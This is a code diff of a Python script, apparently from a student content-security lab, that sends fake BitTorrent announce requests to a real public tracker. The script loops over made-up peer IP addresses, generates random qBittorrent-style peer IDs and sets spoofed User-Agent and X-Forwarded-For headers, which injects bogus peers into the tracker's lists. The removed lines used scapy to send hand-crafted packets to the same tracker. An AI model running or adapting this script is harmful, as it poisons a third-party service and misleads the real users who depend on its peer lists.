@@ -1,37 +1,44 @@
 from scapy.all import *
-from bt_protocol_restore.convert import *
-from bt_protocol_restore.Protocol_Restore import *
+
 import random
 import string
+# coding:utf-8
+from urllib import request
+from urllib import parse
 class send_pollution:
 
 
-    def send_udp_announce(self, dst):
-        eth = Ether()
-        IPlayer = IP( dst=dst)
-        UDPlayer = UDP(sport=54066, dport = 80)
-        # with open("D:\JuniorSpring\信息内容安全\contentSecurityLab\\test\\"+dst+".txt","rb") as f:
-        #     data = f.read()
-        # ip_addr = "45.168.249.205"
-        # ip = socket.inet_aton(ip_addr)
-        # data = exchange_bytes(bytearray(data), 84, 4, bytearray(ip))
-        # peer_id_array = bytearray(os.urandom(20))
-        # data = exchange_bytes(bytearray(data), 36, 20, peer_id_array)
-        data = '123435'
-        pkt = IPlayer / UDPlayer / data
-        send(pkt)
+    # def send_udp_announce(self, dst):
+    #     eth = Ether()
+    #     IPlayer = IP( dst=dst)
+    #     UDPlayer = UDP(sport=54066, dport = 80)
+    #     # with open("D:\JuniorSpring\信息内容安全\contentSecurityLab\\test\\"+dst+".txt","rb") as f:
+    #     #     data = f.read()
+    #     # ip_addr = "45.168.249.205"
+    #     # ip = socket.inet_aton(ip_addr)
+    #     # data = exchange_bytes(bytearray(data), 84, 4, bytearray(ip))
+    #     # peer_id_array = bytearray(os.urandom(20))
+    #     # data = exchange_bytes(bytearray(data), 36, 20, peer_id_array)
+    #     data = '123435'
+    #     pkt = IPlayer / UDPlayer / data
+    #     send(pkt)
 
     def send_http_announce(self, dst):
-        ip = '101.101.101.'
-        for i in range(100):
-            IPlayer = IP(dst=dst)
-            TCPlayer = TCP(sport=54118+i, dport=1337)
-            newip = ip+str(i)
+        for i in range(100,110):
+            newip = str(i) + "." + str(i) + "." + str(i) + "." + '0'
             peer_id = '-qB4250-' + generate_random_str(12)
-            data = "GET /announce?info_hash=%ceb6%be%c49x%16%b8%89G%92%ad2%a1%99F%9e%ba%80&peer_id="+peer_id+"&ip="+newip+"&port=64997&uploaded=0&downloaded=21511128&left=0&corrupt=0&key=A004ACC7&event=started&numwant=200&compact=1&no_peer_id=1&supportcrypto=1&redundant=0 HTTP/1.1\r\nHost: tracker.opentrackr.org:1337\r\nUser-Agent: qBittorrent/4.2.5\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n'"
-            pkt = IPlayer / TCPlayer / data
-            send(pkt)
-            time.sleep(0.01)
+            url = "http://93.158.213.92:1337/announce?info_hash=%ceb6%be%c49x%16%b8%89G%92%ad2%a1%99F%9e%ba%80&peer_id="+peer_id+"&ip="+newip+"&port=40000&uploaded=0&downloaded=21511128&left=0&corrupt=0&key=A004ACC7&event=started&numwant=200&compact=1&no_peer_id=1&supportcrypto=1&redundant=0HTTP/1.1\r\n"
+            fake_headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101 Firefox/59.0',
+                'Accept': '*/*',
+                'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+                'Accept-Encoding': 'gzip, deflate',
+                'X-Forwarded-For': '1.1.1.1'
+            }
+            request_announce = request.Request(url=url, headers=fake_headers)
+            print(request_announce.headers)
+            response_announce = request.urlopen(request_announce)
+
 
 def generate_random_str(randomlength=16):
     """
@@ -46,3 +53,4 @@ def generate_random_str(randomlength=16):
 
 if __name__ == '__main__':
     send_pollution().send_http_announce('93.158.213.92')
+
